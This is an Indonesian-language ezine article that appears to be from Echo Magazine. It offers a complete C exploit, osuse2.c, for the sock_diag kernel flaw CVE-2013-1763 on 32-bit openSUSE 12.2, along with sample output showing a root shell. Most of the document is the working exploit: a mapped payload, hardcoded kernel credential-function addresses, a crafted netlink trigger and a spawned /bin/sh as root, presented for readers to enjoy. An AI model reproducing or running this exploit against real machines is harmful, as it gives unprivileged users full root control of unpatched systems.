@@ -1,0 +1,139 @@
+ECHO MAGAZINE VOLUME XI, ISSUE XXVII, PHILE 0x09.TXT
+                               :|             ++           
+                     :~~/ .::/ :::| ,::\ >::> :| :::\ :~~/ 
+                     :::, `::\ :|:| `::/ <::< :| :|:| :::, 
+                                                                   
+
+     (Non)Priv8 exploit collection - openSUSE 12.2 sock_diag local root exploit
+     y3dips [at] echo [dot] or [dot] id
+
+
+
+-----| Pendahuluan
+
+Seharusnya exploit ini tidak perlu menghiasi ezine rilis kali ini jikalau
+artikel yang masuk dan berkualitas jumlahnya banyak[1], tetapi ya
+sudahlah, mungkin jadi salah satu sisi baik atau menjadi salah satu
+sisi buruk dari rilis kali ini, silahkan anda tentukan :)
+
+Sebenarnya exploits ini merupakan POC dari CVE-2013-1763[2], dan
+kebetulan ini exploit kedua yang gw tulis untuk isu ini, yang pertama
+itu untuk OS Mageia[3]. Untuk detil celah keamanannya silahkan merujuk
+ke CVE tersebut. Untuk Referensi diskusi terkait isu keamanan ini dan 
+exploit distribusi lainnya bisa ke sini[4][5][6]. 
+
+Mengapa openSUSE 32bit? karena belum ada public exploit untuk os ini :-).
+So, Enjoy!
+
+------------------------- osuse2.c  
+  1 /*
+  2 ammar@linux-chrf:~> uname -a
+  3 Linux linux-chrf 3.4.6-2.10-default #1 SMP Thu Jul 26 09:36:26 UTC 2012 (641c197) i686 i686 i386 GNU/Linux
+  4 ammar@linux-chrf:~> cat /etc/issue
+  5 Welcome to openSUSE 12.2 "Mantis" - Kernel \r (\l).
+  6 
+  7 
+  8 ammar@linux-chrf:~> ./osuse
+  9 [+] openSUSE 12.2 Mantis (32bit) sock_diag_handlers Local root exploit
+ 10 [+] Triggering payload and Exploiting Sockz...
+ 11 [+] Got root!...
+ 12 sh-4.2# id
+ 13 uid=0(root) gid=0(root) groups=0(root)
+ 14 sh-4.2#
+ 15 */
+ 16 
+ 17 
+ 18 #include <unistd.h>
+ 19 #include <sys/socket.h>
+ 20 #include <linux/netlink.h>
+ 21 #include <netinet/tcp.h>
+ 22 #include <errno.h>
+ 23 #include <linux/if.h>
+ 24 #include <linux/filter.h>
+ 25 #include <string.h>
+ 26 #include <stdio.h>
+ 27 #include <stdlib.h>
+ 28 #include <linux/sock_diag.h>
+ 29 #include <linux/inet_diag.h>
+ 30 #include <linux/unix_diag.h>
+ 31 #include <sys/mman.h>
+ 32 
+ 33 typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
+ 34 typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
+ 35 _commit_creds commit_creds;
+ 36 _prepare_kernel_cred prepare_kernel_cred;
+ 37 
+ 38 int __attribute__((regparm(3)))
+ 39 kcode()
+ 40 {
+ 41     commit_creds(prepare_kernel_cred(0));
+ 42     return -1;
+ 43 }
+ 44 
+ 45 char loncat[] = "\x55" //push ebp
+ 46         "\x89\xe5" //mov ebp, esp
+ 47         "\xb8\xEA\x1D\x0D\x60" //mov eax, 0x600D1DEA
+ 48         "\xff\xd0" //call eax
+ 49         "\x5d" //pop ebp
+ 50         "\xc3"; //ret
+ 51 
+ 52 int trigger() {
+ 53     int socks;
+ 54     unsigned long mmap_start = 0x10000;
+ 55     unsigned long mmap_size= 0x120000;
+ 56     void *payload;
+ 57     struct {
+ 58     struct nlmsghdr nlh;
+ 59         struct unix_diag_req r;
+ 60     } req;
+ 61 
+ 62     socks = socket(PF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG);
+ 63     if (socks < 0)
+ 64         { printf("[+] Can't create sock_diag socket\n");
+ 65         return -1; }
+ 66 
+ 67     memset(&req, 0, sizeof(req));
+ 68     req.nlh.nlmsg_len = sizeof(req);
+ 69     req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
+ 70     req.nlh.nlmsg_flags = NLM_F_REQUEST;
+ 71     req.r.sdiag_family = 145; /*nl_table-sock_diag_handlers/4*/
+ 72 
+ 73     payload=mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
+ 74     if ((long)payload == -1)
+ 75         { printf("[+] Failed to mmap() at target.\n");
+ 76         return -1; }
+ 77 
+ 78     *(unsigned long *)&loncat[4] =(unsigned long)kcode;
+ 79     memset((void *)mmap_start, 0x90, mmap_size);
+ 80     memcpy((void *)mmap_start+mmap_size-sizeof(loncat), loncat, sizeof(loncat));
+ 81 
+ 82     send(socks, &req, sizeof(req), 0);
+ 83 }
+ 84 
+ 85 int main()
+ 86 {
+ 87     printf("[+] openSUSE 12.2 Mantis (32bit) sock_diag_handlers Local root exploit\n");
+ 88     /* openSUSE 12.2 Mantis Kernel 3.4.6-2.10 i686*/
+ 89     commit_creds = (_commit_creds) 0xc02539c0;
+ 90         prepare_kernel_cred = (_prepare_kernel_cred) 0xc0253c00;
+ 91         printf("[+] Triggering payload and Exploiting Sockz...\n");
+ 92         trigger();
+ 93     if(getuid()) {
+ 94         printf("[+] Exploit Failed...\n");
+ 95         return -1;
+ 96     }
+ 97     printf("[+] Got root!...\n");
+ 98         execl("/bin/sh", "/bin/sh", NULL);
+ 99 }
+100 
+
+------------------------- osuse2.c  
+
+-----| Referensi
+
+[1] "Echo|Zine ISSUE XVII" http://ezine.echo.or.id/
+[2] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763
+[3] http://packetstormsecurity.com/files/120913/Mageia-Release-2-sock_diag_handlers-Local-Root.html
+[4] https://rdot.org/forum/showthread.php?t=2634
+[5] http://www.exploit-db.com/exploits/24746/
+[6] http://rndc.or.id/wiki/index.php/SockDiag_Exploit_(CVE:_2013-1763) 
